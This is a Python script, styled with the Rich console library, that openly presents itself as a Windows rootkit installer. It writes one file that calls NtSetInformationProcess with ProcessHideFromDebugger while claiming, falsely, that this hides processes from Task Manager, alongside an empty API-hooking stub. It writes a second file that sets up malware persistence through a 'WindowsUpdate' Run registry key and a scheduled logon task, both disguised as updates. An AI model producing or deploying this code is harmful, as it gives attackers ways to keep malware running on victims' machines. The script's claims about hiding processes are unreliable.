#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich Rootkit - Kernel-Level Hiding"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
import os
import ctypes
import subprocess

console = Console()

class RichRootkit:
    def __init__(self):
        self.is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        
    def install_rootkit(self):
        """Install rootkit for hiding processes"""
        console.print(Panel.fit(
            "[bold red]Rich Rootkit Installer[/bold red]",
            border_style="red"
        ))
        
        if not self.is_admin:
            console.print("[red]⚠ Requires admin privileges[/red]")
            return
        
        # Windows rootkit techniques
        code = '''
import ctypes
import sys

class Rootkit:
    def hide_process(self, pid):
        ntdll = ctypes.windll.ntdll
        status = ntdll.NtSetInformationProcess(
            ctypes.c_void_p(-1),
            31,  # ProcessHideFromDebugger
            ctypes.byref(ctypes.c_int(1)),
            ctypes.sizeof(ctypes.c_int)
        )
        return status == 0
    
    def hook_api(self):
        kernel32 = ctypes.windll.kernel32
        # API hooking for function interception
        pass

rootkit = Rootkit()
rootkit.hide_process(0)
'''
        
        with open("rootkit.py", 'w') as f:
            f.write(code)
        
        console.print("[green]✓ Rootkit installed[/green]")
        console.print("[yellow]Processes will be hidden from task manager[/yellow]")
    
    def create_persistence(self):
        """Create persistence mechanisms"""
        console.print("[bold cyan]Creating persistence...[/bold cyan]")
        
        persistence_code = '''
# Registry persistence
import winreg

def add_to_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, "malware.exe")
    winreg.CloseKey(key)

# Task Scheduler persistence
import subprocess
subprocess.run(['schtasks', '/create', '/tn', 'Update', 
               '/tr', 'malware.exe', '/sc', 'onlogon', '/f'])
'''
        
        with open("persistence.py", 'w') as f:
            f.write(persistence_code)
        
        console.print("[green]✓ Persistence created[/green]")

if __name__ == "__main__":
    rootkit = RichRootkit()
    rootkit.install_rootkit()

